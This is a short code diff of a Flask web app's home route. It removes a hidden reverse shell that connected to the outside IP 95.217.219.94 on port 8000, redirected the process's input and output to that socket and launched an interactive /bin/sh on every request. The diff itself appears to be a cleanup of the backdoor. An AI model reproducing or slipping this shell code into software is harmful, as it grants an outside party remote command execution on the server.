@@ -14,12 +14,6 @@ app = Flask(__name__)
   
 @app.route('/', methods = ['GET']) 
 def home(): 
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("95.217.219.94",8000))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    p=subprocess.call(["/bin/sh","-i"])
     return jsonify({'data': "Hello World"}) 
   
   
